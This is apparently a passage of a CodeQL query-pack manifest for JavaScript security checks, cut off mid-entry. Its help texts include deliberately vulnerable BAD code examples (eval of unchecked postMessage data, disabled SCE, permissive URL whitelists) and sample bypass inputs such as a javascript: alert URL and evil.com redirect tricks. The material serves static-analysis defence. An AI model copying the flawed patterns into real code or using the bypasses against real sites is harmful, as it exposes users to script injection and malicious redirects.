---
queries:
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/DisablingSce.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/DisablingSce.bqrs
  metadata:
    name: Disabling SCE
    description: Disabling strict contextual escaping (SCE) can cause security vulnerabilities.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: very-high
    id: js/angular/disabling-sce
    tags: |-
      security
             maintainability
             frameworks/angularjs
             external/cwe/cwe-116
  queryHelp: "# Disabling SCE\nAngularJS is secure by default through automated sanitization\
    \ and filtering of untrusted values that could cause vulnerabilities such as XSS.\
    \ Strict Contextual Escaping (SCE) is an execution mode in AngularJS that provides\
    \ this security mechanism.\n\nDisabling SCE in an AngularJS application is strongly\
    \ discouraged. It is even more discouraged to disable SCE in a library, since\
    \ it is an application-wide setting.\n\n\n## Recommendation\nDo not disable SCE.\n\
    \n\n## Example\nThe following example shows an AngularJS application that disables\
    \ SCE in order to dynamically construct an HTML fragment, which is later inserted\
    \ into the DOM through `$scope.html`.\n\n\n```javascript\nangular.module('app',\
    \ [])\n    .config(function($sceProvider) {\n        $sceProvider.enabled(false);\
    \ // BAD\n    }).controller('controller', function($scope) {\n        // ...\n\
    \        $scope.html = '<ul><li>' + item.toString() + '</li></ul>';\n    });\n\
    \n```\nThis is problematic, since it disables SCE for the entire AngularJS application.\n\
    \nInstead, just mark the dynamically constructed HTML fragment as safe using `$sce.trustAsHtml`,\
    \ before assigning it to `$scope.html`:\n\n\n```javascript\nangular.module('app',\
    \ [])\n    .controller('controller', function($scope, $sce) {\n        // ...\n\
    \        // GOOD (but should use the templating system instead)\n        $scope.html\
    \ = $sce.trustAsHtml('<ul><li>' + item.toString() + '</li></ul>'); \n    });\n\
    \n```\nPlease note that this example is for illustrative purposes only; use the\
    \ AngularJS templating system to dynamically construct HTML when possible.\n\n\
    \n## References\n* AngularJS Developer Guide: [Strict Contextual Escaping](https://docs.angularjs.org/api/ng/service/$sce)\n\
    * AngularJS Developer Guide: [Can I disable SCE completely?](https://docs.angularjs.org/api/ng/service/$sce#can-i-disable-sce-completely-).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/DoubleCompilation.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/DoubleCompilation.bqrs
  metadata:
    name: Double compilation
    description: |-
      Recompiling an already compiled part of the DOM can lead to
                    unexpected behavior of directives, performance problems, and memory leaks.
    kind: problem
    problem.severity: warning
    security-severity: 8.8
    id: js/angular/double-compilation
    tags: |-
      reliability
             frameworks/angularjs
             security
             external/cwe/cwe-1176
    precision: very-high
  queryHelp: |
    # Double compilation
    The AngularJS compiler processes (parts of) the DOM, determining which directives match which DOM elements, and then applies the directives to the elements. Each DOM element should only be compiled once, otherwise unexpected behavior may result.


    ## Recommendation
    Only compile new DOM elements.


    ## Example
    The following example (adapted from the AngularJS developer guide) shows a directive that adds a tooltip to a DOM element, and then compiles the entire element to apply nested directives.


    ```javascript
    angular.module('myapp')
           .directive('addToolTip', function($compile) {
      return {
        link: function(scope, element, attrs) {
          var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
          tooltip.on('mouseenter mouseleave', function() {
            scope.$apply('showToolTip = !showToolTip');
          });
          element.append(tooltip);
          $compile(element)(scope); // NOT OK
        }
      };
    });

    ```
    This is problematic, since it will recompile all of `element`, including parts that have already been compiled.

    Instead, only the new element should be compiled:


    ```javascript
    angular.module('myapp')
           .directive('addToolTip', function($compile) {
      return {
        link: function(scope, element, attrs) {
          var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
          tooltip.on('mouseenter mouseleave', function() {
            scope.$apply('showToolTip = !showToolTip');
          });
          element.append(tooltip);
          $compile(tooltip)(scope); // OK
        }
      };
    });

    ```

    ## References
    * AngularJS Developer Guide: [Double Compilation, and how to avoid it](https://docs.angularjs.org/guide/compiler#double-compilation-and-how-to-avoid-it).
    * Common Weakness Enumeration: [CWE-1176](https://cwe.mitre.org/data/definitions/1176.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/InsecureUrlWhitelist.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/InsecureUrlWhitelist.bqrs
  metadata:
    name: Insecure URL whitelist
    description: URL whitelists that are too permissive can cause security vulnerabilities.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: very-high
    id: js/angular/insecure-url-whitelist
    tags: |-
      security
             frameworks/angularjs
             external/cwe/cwe-183
             external/cwe/cwe-625
  queryHelp: |
    # Insecure URL whitelist
    AngularJS uses filters to ensure that the URLs used for sourcing AngularJS templates and other script-running URLs are safe. One such filter is a whitelist of URL patterns to allow.

    A URL pattern that is too permissive can cause security vulnerabilities.


    ## Recommendation
    Make the whitelist URL patterns as restrictive as possible.


    ## Example
    The following example shows an AngularJS application with whitelist URL patterns that all are too permissive.


    ```javascript
    angular.module('myApp', [])
        .config(function($sceDelegateProvider) {
            $sceDelegateProvider.resourceUrlWhitelist([
                "*://example.org/*", // BAD
                "https://**.example.com/*", // BAD
                "https://example.**", // BAD
                "https://example.*" // BAD
            ]);
        });

    ```
    This is problematic, since the four patterns match the following malicious URLs, respectively:

    * `javascript://example.org/a%0A%0Dalert(1)` (`%0A%0D` is a linebreak)
    * `https://evil.com/?ignore=://example.com/a`
    * `https://example.evil.com`
    * `https://example.evilTld`

    ## References
    * OWASP/Google presentation: [Securing AngularJS Applications](https://www.owasp.org/images/6/6e/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf)
    * AngularJS Developer Guide: [Format of items in resourceUrlWhitelist/Blacklist](https://docs.angularjs.org/api/ng/service/$sce#resourceUrlPatternItem).
    * Common Weakness Enumeration: [CWE-183](https://cwe.mitre.org/data/definitions/183.html).
    * Common Weakness Enumeration: [CWE-625](https://cwe.mitre.org/data/definitions/625.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Diagnostics/ExtractedFiles.ql
  relativeBqrsPath: codeql/javascript-queries/Diagnostics/ExtractedFiles.bqrs
  metadata:
    name: Extracted files
    description: Lists all files in the source code directory that were extracted.
    kind: diagnostic
    id: js/diagnostics/successfully-extracted-files
    tags: successfully-extracted-files
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Diagnostics/ExtractionErrors.ql
  relativeBqrsPath: codeql/javascript-queries/Diagnostics/ExtractionErrors.bqrs
  metadata:
    name: Extraction errors
    description: List all extraction errors for files in the source code directory.
    kind: diagnostic
    id: js/diagnostics/extraction-errors
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Electron/AllowRunningInsecureContent.ql
  relativeBqrsPath: codeql/javascript-queries/Electron/AllowRunningInsecureContent.bqrs
  metadata:
    name: Enabling Electron allowRunningInsecureContent
    description: Enabling allowRunningInsecureContent can allow remote code execution.
    kind: problem
    problem.severity: error
    security-severity: 8.8
    precision: very-high
    tags: |-
      security
             frameworks/electron
             external/cwe/cwe-494
    id: js/enabling-electron-insecure-content
  queryHelp: |
    # Enabling Electron allowRunningInsecureContent
    Electron is secure by default through a policy banning the execution of content loaded over HTTP. Setting the `allowRunningInsecureContent` property of a `webPreferences` object to `true` will disable this policy.

    Enabling the execution of insecure content is strongly discouraged.


    ## Recommendation
    Do not enable the `allowRunningInsecureContent` property.


    ## Example
    The following example shows `allowRunningInsecureContent` being enabled.


    ```javascript
    const mainWindow = new BrowserWindow({
      webPreferences: {
        allowRunningInsecureContent: true
      }
    })
    ```
    This is problematic, since it allows the execution of code from an untrusted origin.


    ## References
    * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#8-do-not-set-allowrunninginsecurecontent-to-true)
    * Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Electron/DisablingWebSecurity.ql
  relativeBqrsPath: codeql/javascript-queries/Electron/DisablingWebSecurity.bqrs
  metadata:
    name: Disabling Electron webSecurity
    description: Disabling webSecurity can cause critical security vulnerabilities.
    kind: problem
    problem.severity: error
    security-severity: 6.1
    precision: very-high
    tags: |-
      security
             frameworks/electron
             external/cwe/cwe-079
    id: js/disabling-electron-websecurity
  queryHelp: |
    # Disabling Electron webSecurity
    Electron is secure by default through a same-origin policy requiring all JavaScript and CSS code to originate from the machine running the Electron application. Setting the `webSecurity` property of a `webPreferences` object to `false` will disable the same-origin policy.

    Disabling the same-origin policy is strongly discouraged.


    ## Recommendation
    Do not disable `webSecurity`.


    ## Example
    The following example shows `webSecurity` being disabled.


    ```javascript
    const mainWindow = new BrowserWindow({
      webPreferences: {
        webSecurity: false
      }
    })
    ```
    This is problematic, since it allows the execution of insecure code from other domains.


    ## References
    * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#5-do-not-disable-websecurity)
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Performance/PolynomialReDoS.ql
  relativeBqrsPath: codeql/javascript-queries/Performance/PolynomialReDoS.bqrs
  metadata:
    name: Polynomial regular expression used on uncontrolled data
    description: |-
      A regular expression that can require polynomial time
                    to match may be vulnerable to denial-of-service attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/polynomial-redos
    tags: |-
      security
             external/cwe/cwe-1333
             external/cwe/cwe-730
             external/cwe/cwe-400
  queryHelp: |
    # Polynomial regular expression used on uncontrolled data
    Some regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service ("DoS") attack by crafting an expensive input string for the regular expression to match.

    The regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.

    Typically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.


    ## Recommendation
    Modify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.


    ## Example
    Consider this use of a regular expression, which removes all leading and trailing whitespace in a string:

    ```javascript

    text.replace(/^\s+|\s+$/g, ''); // BAD
    ```
    The sub-expression `"\s+$"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.

    This ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `"a b"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.

    Avoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\s+|(?<!\s)\s+$/g`), or just by using the built-in trim method (`text.trim()`).

    Note that the sub-expression `"^\s+"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.


    ## Example
    As a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:

    ```javascript

    /^0\.\d+E?\d+$/.test(str) // BAD
    ```
    The problem with this regular expression is in the sub-expression `\d+E?\d+` because the second `\d+` can start matching digits anywhere after the first match of the first `\d+` if there is no `E` in the input string.

    This is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.

    To make the processing faster, the regular expression should be rewritten such that the two `\d+` sub-expressions do not have overlapping matches: `^0\.\d+(E\d+)?$`.


    ## Example
    Sometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:

    ```javascript

    /^(\+|-)?(\d+|(\d*\.\d*))?(E|e)?([-+])?(\d+)?$/.test(str) // BAD
    ```
    It is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.

    ```javascript

    if (str.length > 1000) {
        throw new Error("Input too long");
    }

    /^(\+|-)?(\d+|(\d*\.\d*))?(E|e)?([-+])?(\d+)?$/.test(str)
    ```

    ## References
    * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
    * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
    * Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).
    * James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).
    * Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Performance/ReDoS.ql
  relativeBqrsPath: codeql/javascript-queries/Performance/ReDoS.bqrs
  metadata:
    name: Inefficient regular expression
    description: |-
      A regular expression that requires exponential time to match certain inputs
                    can be a performance bottleneck, and may be vulnerable to denial-of-service
                    attacks.
    kind: problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/redos
    tags: |-
      security
             external/cwe/cwe-1333
             external/cwe/cwe-730
             external/cwe/cwe-400
  queryHelp: |
    # Inefficient regular expression
    Some regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service ("DoS") attack by crafting an expensive input string for the regular expression to match.

    The regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.

    Typically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.


    ## Recommendation
    Modify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.


    ## Example
    Consider this regular expression:

    ```javascript

    /^_(__|.)+_$/
    ```
    Its sub-expression `"(__|.)+?"` can match the string `"__"` either by the first alternative `"__"` to the left of the `"|"` operator, or by two repetitions of the second alternative `"."` to the right. Thus, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.

    This problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:

    ```javascript

    /^_(__|[^_])+_$/
    ```

    ## References
    * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
    * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
    * Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).
    * James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).
    * Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: RegExp/IdentityReplacement.ql
  relativeBqrsPath: codeql/javascript-queries/RegExp/IdentityReplacement.bqrs
  metadata:
    name: Replacement of a substring with itself
    description: Replacing a substring with itself has no effect and may indicate
      a mistake.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    id: js/identity-replacement
    precision: very-high
    tags: |-
      correctness
             security
             external/cwe/cwe-116
  queryHelp: |
    # Replacement of a substring with itself
    Replacing a substring with itself has no effect and usually indicates a mistake, such as misspelling a backslash escape.


    ## Recommendation
    Examine the string replacement to find and correct any typos.


    ## Example
    The following code snippet attempts to backslash-escape all double quotes in `raw` by replacing all instances of `"` with `\"`:


    ```javascript
    var escaped = raw.replace(/"/g, '\"');

    ```
    However, the replacement string `'\"'` is actually the same as `'"'`, with `\"` interpreted as an identity escape, so the replacement does nothing. Instead, the replacement string should be `'\\"'`:


    ```javascript
    var escaped = raw.replace(/"/g, '\\"');

    ```

    ## References
    * Mozilla Developer Network: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncompleteHostnameRegExp.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteHostnameRegExp.bqrs
  metadata:
    name: Incomplete regular expression for hostnames
    description: Matching a URL or hostname against a regular expression that contains
      an unescaped dot as part of the hostname might match more hostnames than expected.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-hostname-regexp
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Incomplete regular expression for hostnames
    Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.

    If a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.


    ## Recommendation
    Escape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.


    ## Example
    The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param('url'),
            host = urlLib.parse(url).host;
        // BAD: the host of `url` may be controlled by an attacker
        let regex = /^((www|beta).)?example.com/;
        if (host.match(regex)) {
            res.redirect(url);
        }
    });

    ```
    The check is however easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.

    Address this vulnerability by escaping `.` appropriately: `let regex = /^((www|beta)\.)?example\.com/`.


    ## References
    * MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncompleteUrlSchemeCheck.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteUrlSchemeCheck.bqrs
  metadata:
    name: Incomplete URL scheme check
    description: |-
      Checking for the "javascript:" URL scheme without also checking for "vbscript:"
                    and "data:" suggests a logic error or even a security vulnerability.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-url-scheme-check
    tags: |-
      security
             correctness
             external/cwe/cwe-020
             external/cwe/cwe-184
  queryHelp: |
    # Incomplete URL scheme check
    URLs starting with `javascript:` can be used to encode JavaScript code to be executed when the URL is visited. While this is a powerful mechanism for creating feature-rich and responsive web applications, it is also a potential security risk: if the URL comes from an untrusted source, it might contain harmful JavaScript code. For this reason, many frameworks and libraries first check the URL scheme of any untrusted URL, and reject URLs with the `javascript:` scheme.

    However, the `data:` and `vbscript:` schemes can be used to represent executable code in a very similar way, so any validation logic that checks against `javascript:`, but not against `data:` and `vbscript:`, is likely to be insufficient.


    ## Recommendation
    Add checks covering both `data:` and `vbscript:`.


    ## Example
    The following function validates a (presumably untrusted) URL `url`. If it starts with `javascript:` (case-insensitive and potentially preceded by whitespace), the harmless placeholder URL `about:blank` is returned to prevent code injection; otherwise `url` itself is returned.


    ```javascript
    function sanitizeUrl(url) {
        let u = decodeURI(url).trim().toLowerCase();
        if (u.startsWith("javascript:"))
            return "about:blank";
        return url;
    }

    ```
    While this check provides partial projection, it should be extended to cover `data:` and `vbscript:` as well:


    ```javascript
    function sanitizeUrl(url) {
        let u = decodeURI(url).trim().toLowerCase();
        if (u.startsWith("javascript:") || u.startsWith("data:") || u.startsWith("vbscript:"))
            return "about:blank";
        return url;
    }

    ```

    ## References
    * WHATWG: [URL schemes](https://wiki.whatwg.org/wiki/URL_schemes).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncompleteUrlSubstringSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteUrlSubstringSanitization.bqrs
  metadata:
    name: Incomplete URL substring sanitization
    description: Security checks on the substrings of an unparsed URL are often vulnerable
      to bypassing.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-url-substring-sanitization
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Incomplete URL substring sanitization
    Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.

    However, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.

    Even if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.


    ## Recommendation
    Parse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.


    ## Example
    The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param("url");
        // BAD: the host of `url` may be controlled by an attacker
        if (url.includes("example.com")) {
            res.redirect(url);
        }
    });

    ```
    The substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param("url"),
            host = urlLib.parse(url).host;
        // BAD: the host of `url` may be controlled by an attacker
        if (host.includes("example.com")) {
            res.redirect(url);
        }
    });

    ```
    This is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:


    ```javascript
    app.get('/some/path', function(req, res) {
        let url = req.param('url'),
            host = urlLib.parse(url).host;
        // GOOD: the host of `url` can not be controlled by an attacker
        let allowedHosts = [
            'example.com',
            'beta.example.com',
            'www.example.com'
        ];
        if (allowedHosts.includes(host)) {
            res.redirect(url);
        }
    });

    ```

    ## References
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/IncorrectSuffixCheck.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncorrectSuffixCheck.bqrs
  metadata:
    name: Incorrect suffix check
    description: Using indexOf to implement endsWith functionality is error-prone
      if the -1 case is not explicitly handled.
    kind: problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/incorrect-suffix-check
    tags: |-
      security
             correctness
             external/cwe/cwe-020
  queryHelp: |
    # Incorrect suffix check
    The `indexOf` and `lastIndexOf` methods are sometimes used to check if a substring occurs at a certain position in a string. However, if the returned index is compared to an expression that might evaluate to -1, the check may pass in some cases where the substring was not found at all.

    Specifically, this can easily happen when implementing `endsWith` using `indexOf`.


    ## Recommendation
    Use `String.prototype.endsWith` if it is available. Otherwise, explicitly handle the -1 case, either by checking the relative lengths of the strings, or by checking if the returned index is -1.


    ## Example
    The following example uses `lastIndexOf` to determine if the string `x` ends with the string `y`:


    ```javascript
    function endsWith(x, y) {
      return x.lastIndexOf(y) === x.length - y.length;
    }

    ```
    However, if `y` is one character longer than `x`, the right-hand side `x.length - y.length` becomes -1, which then equals the return value of `lastIndexOf`. This will make the test pass, even though `x` does not end with `y`.

    To avoid this, explicitly check for the -1 case:


    ```javascript
    function endsWith(x, y) {
      let index = x.lastIndexOf(y);
      return index !== -1 && index === x.length - y.length;
    }

    ```

    ## References
    * MDN: [String.prototype.endsWith](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith)
    * MDN: [String.prototype.indexOf](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf)
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/MissingOriginCheck.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/MissingOriginCheck.bqrs
  metadata:
    name: Missing origin verification in `postMessage` handler
    description: Missing origin verification in a `postMessage` handler allows any
      windows to send arbitrary data to the handler.
    kind: problem
    problem.severity: warning
    security-severity: 5
    precision: medium
    id: js/missing-origin-check
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-940
  queryHelp: |
    # Missing origin verification in `postMessage` handler
    The `"message"` event is used to send messages between windows. An untrusted window can send a message to a trusted window, and it is up to the receiver to verify the legitimacy of the message. One way of performing that verification is to check the `origin` of the message ensure that it originates from a trusted window.


    ## Recommendation
    Always verify the origin of incoming messages.


    ## Example
    The example below uses a received message to execute some code. However, the origin of the message is not checked, so it might be possible for an attacker to execute arbitrary code.


    ```javascript
    function postMessageHandler(event) {
        let origin = event.origin.toLowerCase();

        console.log(origin)
        // BAD: the origin property is not checked
        eval(event.data);
    }

    window.addEventListener('message', postMessageHandler, false);

    ```
    The example is fixed below, where the origin is checked to be trusted. It is therefore not possible for a malicious user to perform an attack using an untrusted origin.


    ```javascript
    function postMessageHandler(event) {
        console.log(event.origin)
        // GOOD: the origin property is checked
        if (event.origin === 'https://www.example.com') {
            // do something
        }
    }

    window.addEventListener('message', postMessageHandler, false);
    ```

    ## References
    * [Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
    * [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation).
    * [The pitfalls of postMessage](https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-940](https://cwe.mitre.org/data/definitions/940.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/MissingRegExpAnchor.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/MissingRegExpAnchor.bqrs
  metadata:
    name: Missing regular expression anchor
    description: Regular expressions without anchors can be vulnerable to bypassing.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: medium
    id: js/regex/missing-regexp-anchor
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Missing regular expression anchor
    Sanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.

    Even if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.


    ## Recommendation
    Use anchors to ensure that regular expressions match at the expected locations.


    ## Example
    The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.


    ```javascript
    app.get("/some/path", function(req, res) {
        let url = req.param("url");
        // BAD: the host of `url` may be controlled by an attacker
        if (url.match(/https?:\/\/www\.example\.com\//)) {
            res.redirect(url);
        }
    });

    ```
    The check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:


    ```javascript
    app.get("/some/path", function(req, res) {
        let url = req.param("url");
        // GOOD: the host of `url` can not be controlled by an attacker
        if (url.match(/^https?:\/\/www\.example\.com\//)) {
            res.redirect(url);
        }
    });

    ```
    A related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\.example\.com|beta\.example\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\.example\.com)|(beta\.example\.com)/`


    ## References
    * MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/OverlyLargeRange.ql
